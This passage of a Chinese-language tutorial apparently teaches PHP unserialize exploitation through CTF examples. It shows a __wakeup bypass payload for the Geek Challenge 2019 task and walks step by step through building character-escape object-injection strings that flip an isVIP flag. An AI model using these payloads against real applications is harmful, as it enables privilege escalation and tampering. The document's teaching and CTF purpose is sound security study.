<p>通过调用魔术方法__wakeup 将 $test 的值写入 flag.php 文件中，当调用 unserialize () 反序列化操作时会触发__wakeup 魔术方法，接下来就需要构造传进去的 payload</p>
<p>在执行 unserialize () 方法时会触发__wakeup () 方法执行，将传入的字符串反序列化后，会替换掉 test 类里面 $test 变量的值，将 php 探针写入 flag.php 文件中，并通过下面的 require 引用，导致命令执行。</p>
</blockquote>
<h4 id="0x03-__wakeup绕过"><a class="markdownIt-Anchor" href="#0x03-__wakeup绕过">#</a> 0x03 __wakeup () 绕过</h4>
<p>极客大挑战 2019 PHP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Name</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A100%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line">    </span><br><span class="line"><span class="comment">//其实你这么写也行~</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Name</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A100%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p><strong>当成员属性数目大于实际数目时可绕过 wakeup 方法</strong>，其次 private 的 %00 是老生常谈了。多说一句，这是一个 CVE 漏洞</p>
<h4 id="0x04对象逃逸"><a class="markdownIt-Anchor" href="#0x04对象逃逸">#</a> 0x04 对象逃逸</h4>
<p>当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生 PHP 反序列化字符逃逸的漏洞。</p>
<p>对于 PHP 反序列字符逃逸，我们分为以下两种情况进行讨论。</p>
<ul>
<li>过滤后字符变多</li>
<li>过滤后字符变少</li>
</ul>
<h5 id="过滤后字符变多"><a class="markdownIt-Anchor" href="#过滤后字符变多">#</a> 过滤后字符变多</h5>
<p>设我们先定义一个<strong> user</strong> 类，然后里面一共有 3 个成员变量：<strong>username</strong>、<strong>password</strong>、<strong>isVIP</strong>。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span></span><br><span class="line"><span class="comment">//可以看到，由于isVIP在构造函数中被赋值为0，因此序列化后的&quot;isVIP&quot;;i:0</span></span><br></pre></td></tr></table></figure>
<p>这个时候我们增加一个函数，用于对<strong> admin</strong> 字符进行替换，将<strong> admin</strong> 替换为<strong> hacker</strong>，替换函数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function filter($s)&#123;</span><br><span class="line">    return str_replace(&quot;admin&quot;,&quot;hacker&quot;,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一段程序的输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
<p>那么我们的 admin 就会被替换为 hacker</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;  //未过滤</span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; //已过滤</span><br></pre></td></tr></table></figure>
<p>仔细看，虽然 admin 变为了 hacker，但长度并没有从 5 变成 6，<strong>因此我们可以使用对象逃逸将 isVIP 变为 1</strong></p>
<p>在字符变多的对象逃逸中，我们需要构造我们需要的 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;    //length=47</span><br></pre></td></tr></table></figure>
<p>因为我们需要逃逸的字符串长度为<strong> 47</strong>，并且<strong> admin</strong> 每次过滤之后都会变成<strong> hacker</strong>，也就是说每出现一次<strong> admin</strong>，就会多<strong> 1</strong> 个字符。</p>
<p>因此我们需要重复 47 遍 admin，这样他过滤 47 遍，我们的目标 payload 就可以完全覆盖了</p>
<p>因此我们在可控变量处，重复<strong> 47</strong> 遍<strong> admin</strong>，然后加上我们逃逸后的目标子串，可控变量修改如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们利用代码做拼接形成完整的 payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="comment">//上面的第一个&#x27;&#x27;中是我们构造的目标串，第二个&#x27;&#x27;中是马上要被覆盖的串</span></span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure>
<p>由于<strong>反序列化后，多余的子串会被抛弃</strong>， <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; </code> 我们可以直接无视</p>
<p>尝试反序列化验证我们的 isVIP 是否变为了 1</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="string">&#x27;O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a_seri_filter_unseri</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a_seri_filter</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a_seri_filter_unseri</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//result：</span></span><br><span class="line"><span class="keyword">object</span>(user)<span class="comment">#1 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;username&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">282</span>) <span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span></span><br><span class="line">  [<span class="string">&quot;password&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;123456&quot;</span></span><br><span class="line">  [<span class="string">&quot;isVIP&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>那么，灵魂拷问，上面的 username 和 password 都是可控参数，那么我能能不能控制 password 字段？</p>
<p>在这个例子中是不可以的，因为我们不能对用户的密码做替换，但是如果这个字段不是 password，是 nickname 这样的会被过滤的，那么我们的 payload 也可以写在 nickname 中</p>
<p>最后，我们总结一下，想要通过过滤后字符串变多来实现对象逃逸，我们需要哪些步骤</p>
<blockquote>
<p>1. 分析他过滤了那个参数，那个参数是我们可控的</p>
<p>​	上述例子中 username，password 是可控的，但只对 username 进行了过滤，因此我们的对象逃逸就会出现在 username 中</p>
<p>2. 构造我们的 payload，即我们想要覆盖哪个变量</p>
<p>​	上述例子中，我们想要将 isVIP 变为 1，因此我们构造的 payload 为：  <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code> ，并且需要计算长度，为了我们之后的覆盖做准备</p>
<p>3. 分析它的过滤函数，得到每次过滤我们可以逃逸出的字符数量，与我们的 (2) 中 payload 相比，凑够（2）中字符的数量</p>
<p>​	上述例子中，我们从 admin 变为 hacker，每次过滤字符多一个，因此我们要逃逸 47 个字符，我们就需要重复 47 遍 admin</p>
<p>4. 将我们构造的 payload 放到程序中，得到完整的 payload：</p>
<p>​	上述例子中，我们构造的 payload 是：</p>
<p><code>adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code></p>
<p>通过程序：</p>
<p><code>$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;','123456');</code></p>
<p>生成我们最终的 payload：</p>
<p><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</code></p>
<p>5.unserialize 进行验证</p>
</blockquote>
<h5 id="过滤后字符变少"><a class="markdownIt-Anchor" href="#过滤后字符变少">#</a> 过滤后字符变少</h5>
<p>同样的过滤，这次将 admin 变为 hack</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">result:</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>同样，我们想把 isVIP 变为 1，比较一下<strong>现有子串</strong>和<strong>目标子串</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;	//现有子串</span><br><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;	//目标子串</span><br></pre></td></tr></table></figure>
